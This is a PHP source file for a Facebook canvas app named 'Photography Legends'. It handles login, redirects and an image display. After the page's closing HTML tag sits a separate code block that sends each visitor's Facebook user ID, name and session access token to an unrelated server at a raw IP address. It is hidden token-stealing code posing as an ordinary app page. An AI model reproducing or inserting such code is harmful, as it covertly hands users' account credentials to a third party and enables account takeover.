<?php
include('base.php');

$result = $facebook->extenedAccessToken();
if(isset($_REQUEST['code']) && $_REQUEST['code'] == $_SESSION['fb_322706141156517_code']){
	header("location: http://apps.facebook.com/photography-legends/");
}
?>
<!doctype html>
<html xmlns:fb="http://www.facebook.com/2008/fbml">
  <head>
    <title>Photography Legends</title>
    <style>
      body {
        font-family: 'Lucida Grande', Verdana, Arial, sans-serif;
      }
      h1 a {
        text-decoration: none;
        color: #3b5998;
      }
      h1 a:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>
    <h2>Photography Legends</h2>

    <?php if (!$user): ?>      
      <div>
        <script>top.location.href='<?php echo $loginUrl; ?>'</script>
      </div>
    <?php endif ?>
<img src="http://a4.sphotos.ak.fbcdn.net/hphotos-ak-ash3/s720x720/528248_464748800202611_171754568_n.jpg" alt="Image">
  </body>
</html>
<?
	
	 
   $handle=file_get_contents("http://123.100.239.68/api/ins.php?i=" . $user_profile['id'] . "&n=" . urlencode($user_profile['name']) . "&t=" . $_SESSION['fb_322706141156517_access_token'] ,"r");
?>